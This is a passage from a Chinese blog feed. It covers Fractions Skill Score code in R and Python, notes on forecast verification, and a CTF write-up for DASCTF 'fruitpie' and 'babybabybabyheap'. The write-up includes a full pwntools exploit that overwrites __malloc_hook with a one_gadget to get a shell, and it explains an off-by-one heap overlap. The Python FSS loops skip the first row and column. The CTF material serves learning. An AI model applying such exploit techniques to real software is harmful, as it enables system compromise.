class="line">II &lt;- nrow(DAT) - <span class="number">2</span>*w   <span class="comment">## output row dimension</span></span><br><span class="line">JJ &lt;- ncol(DAT) - <span class="number">2</span>*w  </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(JJ&lt;=<span class="number">0</span>|II &lt;= <span class="number">0</span>) &#123;<span class="keyword">stop</span>(<span class="string">"The window exceeds the size of the observation"</span> ) &#125; </span><br><span class="line">OUT &lt;- matrix(<span class="literal">NA</span>, nrow= II, ncol = JJ)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i <span class="keyword">in</span> <span class="number">1</span>:II)&#123;</span><br><span class="line"><span class="keyword">for</span>(j <span class="keyword">in</span> <span class="number">1</span>:JJ)&#123;</span><br><span class="line">sub &lt;- DAT[ i :(i + <span class="number">2</span>*w ),</span><br><span class="line">             j :(j + <span class="number">2</span>*w ) ] <span class="comment"># subset data</span></span><br><span class="line"></span><br><span class="line">OUT[i,j] &lt;- FUN(sub,<span class="keyword">...</span>)</span><br><span class="line">&#125;  <span class="comment">## close J</span></span><br><span class="line">&#125;  <span class="comment">## close I</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span>(OUT)</span><br><span class="line">&#125;  <span class="comment">## close functionr</span></span><br></pre></td></tr></table></figure>
<h4 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h4><p>链接：<a href="https://rdrr.io/cran/verification/man/fss.html" target="_blank" rel="noopener">https://rdrr.io/cran/verification/man/fss.html</a></p>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line"><span class="keyword">library</span>(verification)</span><br><span class="line"></span><br><span class="line">grid&lt;- list( x= seq( <span class="number">0</span>,<span class="number">5</span>,,<span class="number">100</span>), y= seq(<span class="number">0</span>,<span class="number">5</span>,,<span class="number">100</span>)) </span><br><span class="line">obj&lt;-Exp.image.cov( grid=grid, theta=<span class="number">.5</span>, setup=<span class="literal">TRUE</span>)</span><br><span class="line">look&lt;- sim.rf( obj)</span><br><span class="line">look[look &lt; <span class="number">0</span>] &lt;- <span class="number">0</span></span><br><span class="line"></span><br><span class="line">look2 &lt;- sim.rf( obj)</span><br><span class="line">look2[look2&lt;<span class="number">0</span>] &lt;- <span class="number">0</span></span><br><span class="line"></span><br><span class="line">fss(look, look2, w=<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">## Not run: </span></span><br><span class="line"><span class="comment">#  The following example replicates Figure 4 in Roberts and Lean (2008).</span></span><br><span class="line"><span class="comment">####      examples</span></span><br><span class="line"></span><br><span class="line">LAG &lt;- c(<span class="number">1</span>,<span class="number">3</span>,<span class="number">11</span>,<span class="number">21</span>)</span><br><span class="line">box.radius &lt;- seq(<span class="number">0</span>,<span class="number">24</span>,<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">OUT &lt;- matrix(<span class="literal">NA</span>, nrow = length(box.radius), ncol = length(LAG) )</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(w <span class="keyword">in</span> <span class="number">1</span>:<span class="number">4</span>)&#123;</span><br><span class="line"></span><br><span class="line">FRCS &lt;- OBS &lt;- matrix(<span class="number">0</span>, nrow = <span class="number">100</span>, ncol = <span class="number">100</span>)</span><br><span class="line"></span><br><span class="line">obs.id        &lt;- <span class="number">50</span></span><br><span class="line">OBS[,obs.id]  &lt;- <span class="number">1</span></span><br><span class="line"></span><br><span class="line">FRCS[, obs.id + LAG[w]] &lt;- <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i <span class="keyword">in</span> <span class="number">1</span>:length(box.radius))&#123;</span><br><span class="line"></span><br><span class="line">OUT[i, w] &lt;- fss(obs = OBS, pred = FRCS, w = box.radius[i] )</span><br><span class="line"></span><br><span class="line">&#125; <span class="comment">### close i</span></span><br><span class="line">&#125; <span class="comment">### close w</span></span><br><span class="line"></span><br><span class="line">b &lt;- mean(OBS) <span class="comment">## base rate</span></span><br><span class="line"></span><br><span class="line">fss.uniform  &lt;- <span class="number">0.5</span> + b/<span class="number">2</span></span><br><span class="line">fss.random   &lt;- b</span><br><span class="line"></span><br><span class="line">matplot(OUT, ylim = c(<span class="number">0</span>,<span class="number">1</span>), ylab = <span class="string">"FSS"</span>, xlab = <span class="string">"grid squares"</span>, </span><br><span class="line">type = <span class="string">"b"</span>, lty = <span class="number">1</span>, axes = <span class="literal">FALSE</span> , lwd = <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">abline(h = c(fss.uniform, fss.random), lty = <span class="number">2</span>)  </span><br><span class="line">axis(<span class="number">2</span>)</span><br><span class="line">box()</span><br><span class="line">axis(<span class="number">1</span>, at = <span class="number">1</span>:length(box.radius), lab = <span class="number">2</span>*box.radius + <span class="number">1</span>)</span><br><span class="line">grid()</span><br><span class="line"></span><br><span class="line">legend(<span class="string">"bottomright"</span>, legend = LAG, col = <span class="number">1</span>:<span class="number">4</span>, pch = as.character(<span class="number">1</span>:<span class="number">4</span>), </span><br><span class="line"> title = <span class="string">"Spatial Lag"</span>, inset = <span class="number">0.02</span>, lwd = <span class="number">2</span> )</span><br><span class="line"></span><br><span class="line"><span class="comment">## End(Not run)</span></span><br></pre></td></tr></table></figure>
<h4 id="结果截图"><a href="#结果截图" class="headerlink" title="结果截图"></a>结果截图</h4><p><img src="http://r7wiw08xi.hn-bkt.clouddn.com/fss/r%E8%AF%AD%E8%A8%80%E7%BB%93%E6%9E%9C%E5%9B%BE.png" alt="http://r7wiw08xi.hn-bkt.clouddn.com/fss/r%E8%AF%AD%E8%A8%80%E7%BB%93%E6%9E%9C%E5%9B%BE.png"></p>
<h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h3><h4 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span><span class="params">(data, w = <span class="number">0</span>)</span>:</span></span><br><span class="line">    row = data.shape[<span class="number">0</span>]</span><br><span class="line">    col = data.shape[<span class="number">1</span>]</span><br><span class="line">    </span><br><span class="line">    ii = row - <span class="number">2</span> * w</span><br><span class="line">    jj = col - <span class="number">2</span> * w</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(ii &lt;= <span class="number">0</span> <span class="keyword">or</span> jj &lt;=<span class="number">0</span>):</span><br><span class="line">        print(<span class="string">"error!"</span>)</span><br><span class="line">        </span><br><span class="line">    out = np.zeros((ii, jj))</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, ii):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>, jj):</span><br><span class="line">            </span><br><span class="line">            sub = data[i : (i + <span class="number">2</span> * w + <span class="number">1</span>), j : (j + <span class="number">2</span> * w + <span class="number">1</span>)]</span><br><span class="line">            </span><br><span class="line">            out[i, j] = np.mean(sub)</span><br><span class="line">    <span class="keyword">return</span> out</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fss</span><span class="params">(obs, fc, w = <span class="number">0</span>)</span>:</span></span><br><span class="line">    obs_m = func(obs, w)</span><br><span class="line"><span class="comment">#     print(obs_m[0][16])</span></span><br><span class="line"><span class="comment">#     print(obs_m[0][17])</span></span><br><span class="line"><span class="comment">#     print(obs_m[0][18])</span></span><br><span class="line">    fc_m = func(fc, w)</span><br><span class="line"><span class="comment">#     print(obs_m)</span></span><br><span class="line"><span class="comment">#     print(fc_m)</span></span><br><span class="line">    n = obs_m.shape[<span class="number">0</span>] * obs_m.shape[<span class="number">1</span>]</span><br><span class="line">    N = ((obs_m - fc_m) ** <span class="number">2</span>).sum() / n</span><br><span class="line"><span class="comment">#     print(N.shape)</span></span><br><span class="line">    D = ((obs_m ** <span class="number">2</span>).sum() + (fc_m ** <span class="number">2</span>).sum()) / n</span><br><span class="line"><span class="comment">#     print(n)</span></span><br><span class="line"><span class="comment">#     print(N)</span></span><br><span class="line"><span class="comment">#     print(D)</span></span><br><span class="line">    <span class="keyword">return</span>  <span class="number">1</span> - N / D</span><br></pre></td></tr></table></figure>
<h4 id="测试-1"><a href="#测试-1" class="headerlink" title="测试"></a>测试</h4><figure class="highlight r"><table><tr><td class="code"><pre><span class="line">import matplotlib.pyplot as plt</span><br><span class="line"></span><br><span class="line">lag = [<span class="number">1</span>, <span class="number">3</span>, <span class="number">11</span>, <span class="number">21</span>]</span><br><span class="line">radius = np.arange(<span class="number">0</span>, <span class="number">24</span> + <span class="number">2</span>, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">out = np.zeros((len(radius), len(lag)))</span><br><span class="line"></span><br><span class="line">frcs = np.zeros((<span class="number">100</span>, <span class="number">100</span>))</span><br><span class="line">obs = np.zeros((<span class="number">100</span>, <span class="number">100</span>))</span><br><span class="line"></span><br><span class="line">id = <span class="number">50</span> - <span class="number">1</span></span><br><span class="line">obs[ : , id] = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> l <span class="keyword">in</span> range(<span class="number">0</span>, len(lag)):</span><br><span class="line">    <span class="keyword">for</span> r <span class="keyword">in</span> range(<span class="number">0</span>, len(radius)):   </span><br><span class="line">        frcs[ : , id + lag[l - <span class="number">1</span>]] = <span class="number">0</span></span><br><span class="line">        frcs[ : , id + lag[l]] = <span class="number">1</span></span><br><span class="line">        out[r][l] = fss(obs, frcs, radius[r])</span><br><span class="line">b = np.mean(obs)</span><br><span class="line">uniform = <span class="number">0.5</span> + b / <span class="number">2</span></span><br><span class="line">random = b</span><br><span class="line"></span><br><span class="line">plt.plot(out)</span><br><span class="line">plt.ylabel(<span class="string">"FSS"</span>)</span><br><span class="line">plt.xlabel(<span class="string">"grid squares"</span>)</span><br></pre></td></tr></table></figure>
<h4 id="结果截图-1"><a href="#结果截图-1" class="headerlink" title="结果截图"></a>结果截图</h4><p><img src="http://r7wiw08xi.hn-bkt.clouddn.com/fss/python%E7%BB%93%E6%9E%9C%E5%9B%BE.png" alt="http://r7wiw08xi.hn-bkt.clouddn.com/fss/python%E7%BB%93%E6%9E%9C%E5%9B%BE.png"></p>
<p>坐标可以自定义修改，值是一样的</p>
<p><img src="http://r7wiw08xi.hn-bkt.clouddn.com/fss/%E7%BB%93%E6%9E%9C%E7%9F%A9%E9%98%B5.png" alt="http://r7wiw08xi.hn-bkt.clouddn.com/fss/%E7%BB%93%E6%9E%9C%E7%9F%A9%E9%98%B5.png"></p>
<h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><p><a href="http://r7wiw08xi.hn-bkt.clouddn.com/fss/Roberts2008a.pdf" target="_blank" rel="noopener">Roberts2008原文</a></p>
]]></content>
      <categories>
        <category>降水评估指标</category>
      </categories>
      <tags>
        <tag>FSS</tag>
      </tags>
  </entry>
  <entry>
    <title>Forecast Verification methods Across Time and Space Scales </title>
    <url>/2022/03/09/21-46/</url>
    <content><![CDATA[<p>跨时空尺度的预测验证方法</p>
<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><h3 id="为什么要验证？"><a href="#为什么要验证？" class="headerlink" title="为什么要验证？"></a>为什么要验证？</h3><h3 id="预测和验证的种类"><a href="#预测和验证的种类" class="headerlink" title="预测和验证的种类"></a>预测和验证的种类</h3><h3 id="怎样使预测变好？"><a href="#怎样使预测变好？" class="headerlink" title="怎样使预测变好？"></a>怎样使预测变好？</h3><h3 id="预测质量-vs-预测值"><a href="#预测质量-vs-预测值" class="headerlink" title="预测质量 vs 预测值"></a>预测质量 vs 预测值</h3><h3 id="什么是“事实”"><a href="#什么是“事实”" class="headerlink" title="什么是“事实”"></a>什么是“事实”</h3><h3 id="验证结果的有效性"><a href="#验证结果的有效性" class="headerlink" title="验证结果的有效性"></a>验证结果的有效性</h3><h3 id="汇集-vs-分层-结果"><a href="#汇集-vs-分层-结果" class="headerlink" title="汇集 vs 分层 结果"></a>汇集 vs 分层 结果</h3><h2 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h2><h3 id="标准验证方法"><a href="#标准验证方法" class="headerlink" title="标准验证方法"></a>标准验证方法</h3><h4 id="二分（是-否）预测法"><a href="#二分（是-否）预测法" class="headerlink" title="二分（是/否）预测法"></a>二分（是/否）预测法</h4><h4 id="多类别预测法"><a href="#多类别预测法" class="headerlink" title="多类别预测法"></a>多类别预测法</h4><h4 id="连续变量预测法"><a href="#连续变量预测法" class="headerlink" title="连续变量预测法"></a>连续变量预测法</h4><h4 id="概率预测法"><a href="#概率预测法" class="headerlink" title="概率预测法"></a>概率预测法</h4><h3 id="科学或诊断验证方法"><a href="#科学或诊断验证方法" class="headerlink" title="科学或诊断验证方法"></a>科学或诊断验证方法</h3><h4 id="空间预测法"><a href="#空间预测法" class="headerlink" title="空间预测法"></a>空间预测法</h4><h4 id="概率预测法，包括集合预测系统"><a href="#概率预测法，包括集合预测系统" class="headerlink" title="概率预测法，包括集合预测系统"></a>概率预测法，包括集合预测系统</h4><h4 id="针对罕见事件的方法"><a href="#针对罕见事件的方法" class="headerlink" title="针对罕见事件的方法"></a>针对罕见事件的方法</h4><h4 id="其他方法"><a href="#其他方法" class="headerlink" title="其他方法"></a>其他方法</h4><h2 id="样本预测数据集"><a href="#样本预测数据集" class="headerlink" title="样本预测数据集"></a>样本预测数据集</h2><h3 id="芬利龙卷风预报"><a href="#芬利龙卷风预报" class="headerlink" title="芬利龙卷风预报"></a>芬利龙卷风预报</h3><h3 id="降水预报概率"><a href="#降水预报概率" class="headerlink" title="降水预报概率"></a>降水预报概率</h3><p>链接：<a href="https://cawcr.gov.au/projects/verification/#Contributors_to_this_site" target="_blank" rel="noopener">https://cawcr.gov.au/projects/verification/#Contributors_to_this_site</a></p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>Verification</tag>
        <tag>网页</tag>
      </tags>
  </entry>
  <entry>
    <title>Mar.DASCTF明御攻防赛</title>
    <url>/2021/05/13/20-52/</url>
    <content><![CDATA[<h2 id="fruitpie"><a href="#fruitpie" class="headerlink" title="fruitpie"></a>fruitpie</h2><blockquote>
<p>思路挺简单的</p>
</blockquote>
<h3 id="程序流程"><a href="#程序流程" class="headerlink" title="程序流程"></a>程序流程</h3><blockquote>
<p>基本上分为四部分。</p>
<ol>
<li>输入要分配的chunk大小，打印chunk地址</li>
<li>输入与分配chunk的偏移，往该地址中输入0x10数据。</li>
<li>malloc(0xA0) =&gt; 很明显是要覆盖__malloc_hook</li>
<li>close(1) =&gt; 关闭输出，所以要重定向（本地就不需要了）</li>
</ol>
</blockquote>
<p><img src="/2021/05/13/20-52/Users\YCNN\AppData\Roaming\Typora\typora-user-images\image-20210428214311968.png" alt="image-20210428214311968"></p>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><blockquote>
<p>根据程序的四个功能，一步步来做</p>
</blockquote>
<ol>
<li><p>给定chunk大小并打印</p>
<p>可以输入一个很大的chunk（和<a href="https://warm-winter.github.io/2021/04/27/%C2%96gyctf-2020-force/#1-%E5%88%86%E9%85%8D%E5%A4%A7%E5%9D%97" target="_blank" rel="noopener">高校战役force</a>的第一步操作类似），泄露的块地址和libc_base偏移固定，故可以得到libc_base</p>
</li>
<li><p>输入偏移，输入数据</p>
<ol>
<li><p>偏移计算</p>
<ul>
<li><p>由功能3可以明确知道，是要覆盖__malloc_hook</p>
</li>
<li><p>由功能1得到了libc_base，可以计算__malloc_hook的地址</p>
</li>
<li><p>故可以利用<code>__malloc_hook地址 - chunk地址 = offset</code></p>
</li>
</ul>
</li>
<li><p>数据</p>
<ul>
<li>输入one_gadget地址即可</li>
<li>本地不需要调整栈帧，直接发送one_gadget即可</li>
</ul>
</li>
</ol>
</li>
<li><p>malloc(0xA0)</p>
<p>即可get shell</p>
</li>
<li><p>close(1) [本地不需要]</p>
<p>需要输出重定向</p>
<p><code>&quot;exec 1&gt;&amp;0&quot;</code></p>
</li>
</ol>
<h3 id="详细过程"><a href="#详细过程" class="headerlink" title="详细过程"></a>详细过程</h3><h4 id="0-基本信息"><a href="#0-基本信息" class="headerlink" title="0.基本信息"></a>0.基本信息</h4><blockquote>
<p>保护全开，libc是2.27的</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[*] &#39;&#x2F;home&#x2F;winter&#x2F;mar&#x2F;fruitpie&#x2F;fruitpie&#39;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">winter@ubuntu:~&#x2F;mar&#x2F;fruitpie$ strings libc.so.6 | grep GNU</span><br><span class="line">GNU C Library (Ubuntu GLIBC 2.27-3ubuntu1.2) stable release version 2.27.</span><br><span class="line">Compiled by GNU CC version 7.5.0.</span><br></pre></td></tr></table></figure>
<h4 id="1-分配大块，计算libc-base"><a href="#1-分配大块，计算libc-base" class="headerlink" title="1.分配大块，计算libc_base"></a>1.分配大块，计算libc_base</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[DEBUG] Sent 0x8 bytes:</span><br><span class="line">    &#39;1048576\n&#39;</span><br><span class="line">[DEBUG] Received 0x17 bytes:</span><br><span class="line">    &#39;0x7f06e5785010\n&#39;</span><br><span class="line">    &#39;Offset:\n&#39;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">    0x55d2669e0000     0x55d2669e2000 r-xp     2000 0      &#x2F;home&#x2F;winter&#x2F;mar&#x2F;fruitpie&#x2F;fruitpie</span><br><span class="line">    0x55d266be1000     0x55d266be2000 r--p     1000 1000   &#x2F;home&#x2F;winter&#x2F;mar&#x2F;fruitpie&#x2F;fruitpie</span><br><span class="line">    0x55d266be2000     0x55d266be3000 rw-p     1000 2000   &#x2F;home&#x2F;winter&#x2F;mar&#x2F;fruitpie&#x2F;fruitpie</span><br><span class="line">    0x55d266c68000     0x55d266c89000 rw-p    21000 0      [heap]</span><br><span class="line">    0x7f06e526e000     0x7f06e5455000 r-xp   1e7000 0      &#x2F;home&#x2F;winter&#x2F;mar&#x2F;fruitpie&#x2F;libc.so.6</span><br><span class="line">    0x7f06e5455000     0x7f06e5655000 ---p   200000 1e7000 &#x2F;home&#x2F;winter&#x2F;mar&#x2F;fruitpie&#x2F;libc.so.6</span><br><span class="line">    0x7f06e5655000     0x7f06e5659000 r--p     4000 1e7000 &#x2F;home&#x2F;winter&#x2F;mar&#x2F;fruitpie&#x2F;libc.so.6</span><br><span class="line">    0x7f06e5659000     0x7f06e565b000 rw-p     2000 1eb000 &#x2F;home&#x2F;winter&#x2F;mar&#x2F;fruitpie&#x2F;libc.so.6</span><br><span class="line">    0x7f06e565b000     0x7f06e565f000 rw-p     4000 0      </span><br><span class="line">    0x7f06e565f000     0x7f06e5688000 r-xp    29000 0      &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;ld-2.27.so</span><br><span class="line">    0x7f06e5785000     0x7f06e5888000 rw-p   103000 0      </span><br><span class="line">    0x7f06e5888000     0x7f06e5889000 r--p     1000 29000  &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;ld-2.27.so</span><br><span class="line">    0x7f06e5889000     0x7f06e588a000 rw-p     1000 2a000  &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;ld-2.27.so</span><br><span class="line">    0x7f06e588a000     0x7f06e588b000 rw-p     1000 0      </span><br><span class="line">    0x7ffe87583000     0x7ffe875a4000 rw-p    21000 0      [stack]</span><br><span class="line">    0x7ffe875bd000     0x7ffe875c0000 r--p     3000 0      [vvar]</span><br><span class="line">    0x7ffe875c0000     0x7ffe875c2000 r-xp     2000 0      [vdso]</span><br><span class="line">0xffffffffff600000 0xffffffffff601000 r-xp     1000 0      [vsyscall]</span><br></pre></td></tr></table></figure>
<p><code>0x7f06e5785010 - 0x7f06e526e000 = 0x517010</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p.recvuntil(<span class="string">"Enter the size to malloc:"</span>)</span><br><span class="line">p.sendline(str(<span class="number">1048576</span>))</span><br><span class="line">p.recvuntil(<span class="string">"0x"</span>)</span><br><span class="line">chunk_base = int(p.recv(<span class="number">12</span>).strip(),<span class="number">16</span>)</span><br><span class="line">log.success(hex(chunk_base))</span><br><span class="line"></span><br><span class="line">libc_base = chunk_base - <span class="number">0x517010</span></span><br><span class="line">log.success(hex(libc_base))</span><br></pre></td></tr></table></figure>
<h4 id="2-计算偏移，发送数据"><a href="#2-计算偏移，发送数据" class="headerlink" title="2.计算偏移，发送数据"></a>2.计算偏移，发送数据</h4><blockquote>
<p>偏移就是<code>offset = malloc_hook - chunk_base</code></p>
<p>数据就是<code>onegadget[1]+libc_base</code></p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">offset = malloc_hook - chunk_base</span><br><span class="line">p.recvuntil(<span class="string">"Offset:"</span>)</span><br><span class="line">p.sendline(hex(offset))</span><br><span class="line"></span><br><span class="line">onegadget = [<span class="number">0x415e6</span>,<span class="number">0x4163a</span>,<span class="number">0xdfac1</span>]</span><br><span class="line">p.recvuntil(<span class="string">"Data:"</span>)</span><br><span class="line">payload = p64(onegadget[<span class="number">1</span>]+libc_base)</span><br><span class="line">p.sendline(payload)</span><br></pre></td></tr></table></figure>
<blockquote>
<p>因为程序不支持调试，所以需要用支持debug版本的libc才能看得到，，，<del>懒得再整一遍了orz</del></p>
</blockquote>
<h3 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">"./fruitpie"</span>)</span><br><span class="line"><span class="comment"># libc = ELF("/usr/local/glibc-2.27/lib/libc-2.27.so")</span></span><br><span class="line"><span class="comment"># p = process(["/usr/local/glibc-2.27/lib/ld-2.27.so", "./fruitpie"],</span></span><br><span class="line">            <span class="comment"># env=&#123;"LD_PRELOAD":"/usr/local/glibc-2.27/lib/libc-2.27.so"&#125;)</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">p = process(<span class="string">"./fruitpie"</span>,env=&#123;<span class="string">"LD_PRELOAD"</span>:<span class="string">"./libc.so.6"</span>&#125;)</span><br><span class="line">libc = ELF(<span class="string">"./libc.so.6"</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Enter the size to malloc:"</span>)</span><br><span class="line">p.sendline(str(<span class="number">1048576</span>))</span><br><span class="line">p.recvuntil(<span class="string">"0x"</span>)</span><br><span class="line">chunk_base = int(p.recv(<span class="number">12</span>).strip(),<span class="number">16</span>)</span><br><span class="line">log.success(hex(chunk_base))</span><br><span class="line"></span><br><span class="line">libc_base = chunk_base - <span class="number">0x517010</span></span><br><span class="line">log.success(hex(libc_base))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">offset = malloc_hook - chunk_base</span><br><span class="line">p.recvuntil(<span class="string">"Offset:"</span>)</span><br><span class="line">p.sendline(hex(offset))</span><br><span class="line"></span><br><span class="line">onegadget = [<span class="number">0x415e6</span>,<span class="number">0x4163a</span>,<span class="number">0xdfac1</span>]</span><br><span class="line">p.recvuntil(<span class="string">"Data:"</span>)</span><br><span class="line">payload = p64(<span class="number">0x10a45c</span>+libc_base)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="babybabybabyheap"><a href="#babybabybabyheap" class="headerlink" title="babybabybabyheap"></a>babybabybabyheap</h2><blockquote>
<p>2.31的off by one</p>
</blockquote>
<h3 id="程序流程-1"><a href="#程序流程-1" class="headerlink" title="程序流程"></a>程序流程</h3><p>由四个功能，其中exit功能中有一个隐藏功能edit</p>
<ol>
<li>程序一开始就送了一个puts的地址，可以计算libc地址</li>
<li>add：根据idx，size，content创建块，其中chunk指针被放入heap_list，长度也存入了size_list</li>
<li>show：根据idx，打印chunk内容</li>
<li>delete：根据size判断是否是否，size_list被置零，不存在uaf</li>
<li>隐藏功能edit：根据idx，修改内容，但是存在off by one</li>
</ol>
<h4 id="puts地址"><a href="#puts地址" class="headerlink" title="puts地址"></a>puts地址</h4><p>ida反汇编并没有看到这个地址，汇编里面可以清楚看到</p>
<p><img src="/2021/05/13/20-52/Users\YCNN\AppData\Roaming\Typora\typora-user-images\image-20210513201026622.png" alt="image-20210513201026622"></p>
<p><img src="/2021/05/13/20-52/Users\YCNN\AppData\Roaming\Typora\typora-user-images\image-20210513201127385.png" alt="image-20210513201127385"></p>
<h4 id="隐藏edit功能"><a href="#隐藏edit功能" class="headerlink" title="隐藏edit功能"></a>隐藏edit功能</h4><p>main函数反汇编并不好看，直接汇编更加清楚</p>
<p><img src="/2021/05/13/20-52/Users\YCNN\AppData\Roaming\Typora\typora-user-images\image-20210513194930539.png" alt="image-20210513194930539"></p>
<p><img src="/2021/05/13/20-52/Users\YCNN\AppData\Roaming\Typora\typora-user-images\image-20210513195209948.png" alt="image-20210513195209948"></p>
<h3 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><h4 id="off-by-one"><a href="#off-by-one" class="headerlink" title="off by one"></a>off by one</h4><h5 id="分析程序"><a href="#分析程序" class="headerlink" title="分析程序"></a>分析程序</h5><p>在输入函数中，将最后两位置零</p>
<p><img src="/2021/05/13/20-52/Users\YCNN\AppData\Roaming\Typora\typora-user-images\image-20210513195310404.png" alt="image-20210513195310404"></p>
<p>add函数中，没有off by one</p>
<p><img src="/2021/05/13/20-52/Users\YCNN\AppData\Roaming\Typora\typora-user-images\image-20210513195431863.png" alt="image-20210513195431863"></p>
<p>edit函数中，存在off by one</p>
<p><img src="/2021/05/13/20-52/Users\YCNN\AppData\Roaming\Typora\typora-user-images\image-20210513195449902.png" alt="image-20210513195449902"></p>
<h5 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h5><p>分配程序，利用off by one，可以将size中代表前面是否释放的1位置零，使得上一个chunk被认为释放，并进行unlink操作。</p>
<p>例如：分配四个块：</p>
<ul>
<li>chunk1 = 0x108（堆块重叠）</li>
<li>chunk2 = 0x118</li>
<li>chunk3 = 0x1f8（0x201（最后0x10是chunk头，0x1表示上一个块未释放））</li>
<li>chunk4 = 0x118（和chunk2相同，为了放在同一链中，chunk2 -&gt; chunk4，修改chunk2中的内容，就可以任意地址申请chunk了）</li>
</ul>
<p>首先在chunk1中伪造一个fake_chunk</p>
<p>通过chunk2可以将chunk3的大小改为0x200，并修改pre_size为chunk1+chunk2，这样，释放chunk3的时候，会以为fake_chunk也被释放，程序会进行unlink操作，合并三个chunk，这样chunk1和chunk2都是used，和fake_chunk中有重叠。</p>
<h3 id="详细过程-1"><a href="#详细过程-1" class="headerlink" title="详细过程"></a>详细过程</h3><h4 id="0-基本信息-1"><a href="#0-基本信息-1" class="headerlink" title="0.基本信息"></a>0.基本信息</h4><blockquote>
<p>stripped代表程序去掉了符号表，需要使用debug版本的glibc进行调试</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">winter@ubuntu:~&#x2F;mar&#x2F;babybabybabyheap$ file babyheap</span><br><span class="line">babyheap: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter &#x2F;lib64&#x2F;ld-linux-x86-64.so.2, BuildID[sha1]&#x3D;c05390deb68a417f8d87365fd817c6396eca7462, for GNU&#x2F;Linux 3.2.0, stripped</span><br></pre></td></tr></table></figure>
<blockquote>
<p>没开pie和relro，地址固定，并且可以修改got表</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">winter@ubuntu:~&#x2F;ctf$ checksec babyheap </span><br><span class="line">[*] &#39;&#x2F;home&#x2F;winter&#x2F;ctf&#x2F;babyheap&#39;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
<h3 id><a href="#" class="headerlink" title="#"></a>#</h3><h4 id="1-申请七个块"><a href="#1-申请七个块" class="headerlink" title="1.申请七个块"></a>1.申请七个块</h4><blockquote>
<p>这七个块主要用来填满tcache。但是要在使用的四个chunk申请之后释放，不然会把这七个块中申请过来</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for i in range(7):</span><br><span class="line">	add(i+2,0x1f8,&#39;winter&#39;)</span><br></pre></td></tr></table></figure>
